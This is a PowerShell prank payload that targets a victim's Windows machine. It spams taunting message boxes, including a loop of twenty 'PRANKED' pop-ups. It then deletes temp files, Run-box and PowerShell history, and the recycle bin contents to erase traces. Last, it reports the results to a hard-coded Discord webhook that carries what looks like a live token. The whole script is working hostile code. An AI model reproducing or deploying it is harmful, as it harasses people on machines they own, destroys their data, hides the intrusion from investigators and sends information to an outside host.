function CleaningTraceDiscord {

    [CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$textCTD 
)

    $hookurlCTD = 'https://discord.com/api/webhooks/1044485702794084455/LX6w6wIM008OcwqYx62eaZnSFvYZnnVEpmD0C6UFGgLOsHQe2F1mP85H3X6H_cinAu5l'

    $BodyCTD = @{
        'username' = 'PopupSpamCleaner'
        'content' = $textCTD
    }

    if (-not ([string]::IsNullOrEmpty($textCTD))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurlCTD  -Method Post -Body ($BodyCTD | ConvertTo-Json)};
}


function CleanExfil { 

    # empty temp folder
    $rmTemp = Remove-Item $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

        if ($rmTemp -eq "error")
    {
        Write-Output "failed to remove temp"
    }
    else
    {
        Write-Output "completed temp removal"
    }
    
    # delete run box history
    $rmRunBoxHist = reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
    
    if ($rmRunBoxHist -eq "error")
    {
        Write-Output "failed to remove run box history"
    }
    else
    {
        Write-Output "completed run box history removal"
    }

    # Delete powershell history
    
    $rmPShellHist = Remove-Item (Get-PSreadlineOption).HistorySavePath
   
    if ($rmPShellHist -eq "error")
    {
        Write-Output "failed to remove Powershell history"
    }
    else
    {
        Write-Output "completed Powershell history removal"
    }   

    # Empty recycle bin
    $EmpRecBin = Clear-RecycleBin -Force -ErrorAction SilentlyContinue

    if ($EmpRecBin -eq "error")
    {
        Write-Output "failed to empty recycling bin"
    }
    else
    {
        Write-Output "completed emptying recycling bin"
    }
    
}
function MsgBox {

    [CmdletBinding()]
    param (	
    [Parameter (Mandatory = $True)]
    [Alias("m")]
    [string]$message,
    
    [Parameter (Mandatory = $False)]
    [Alias("t")]
    [string]$title,
    
    [Parameter (Mandatory = $False)]
    [Alias("b")]
    [ValidateSet('OK','OKCancel','YesNoCancel','YesNo')]
    [string]$button,
    
    [Parameter (Mandatory = $False)]
    [Alias("i")]
    [ValidateSet('None','Hand','Question','Warning','Asterisk')]
    [string]$image
    )
    
    Add-Type -AssemblyName PresentationCore,PresentationFramework
    
    if (!$title) {$title = " "}
    if (!$button) {$button = "OK"}
    if (!$image) {$image = "None"}
    
    [System.Windows.MessageBox]::Show($message,$title,$button,$image)
    
}


MsgBox -m "Well, well, well..... You've been got." -t "GOTCHA" -b OK -i Hand

MsgBox -m "However, I'm feeling nice today..... Depending on your next answer, you'll be set free..... or you won't." -t "DUN DUN DUN" -b OK -i Asterisk

MsgBox -m "Is gold at the end of the rainbow?" -t "ANSWER" -b YesNo -i Question

MsgBox -m "The answer was W..... get it? R-A-I-N-B-O-W..... the end is W..... I am so funny. Anyway, no matter your choice you weren't going to win." -t "hehehe" -b OK -Asterisk

MsgBox -m "Goodluck. It won't be forever, I promise, just keep clicking, don't go too fast though, one of them may have a clue to get out." -t "GOODLUCK" -b OK -Asterisk

function MsgBoxLoop {

$var = 1
Do {
    MsgBox -m 'PRANKED PRANKED PRANKED PRANKED PRANKED PRANKED PRANKED PRANKED PRANKED PRANKED PRANKED PRANKED PRANKED PRANKED PRANKED PRANKED PRANKED PRANKED ' -t "PRANKED" -b OK -i Warning
    $var++
}
Until($var -ge 21)
}

MsgBoxLoop

MsgBox -m "Alright, alright, everything is over now, you can go back to having your computer, be safer next time hun." -t "GAMEOVER" -b OK -i Hand

$CleanExfilDiscord = CleanExfil

$CleanExfilDiscordStr = Out-String -InputObject $CleanExfilDiscord

CleaningTraceDiscord -text $CleanExfilDiscordStr
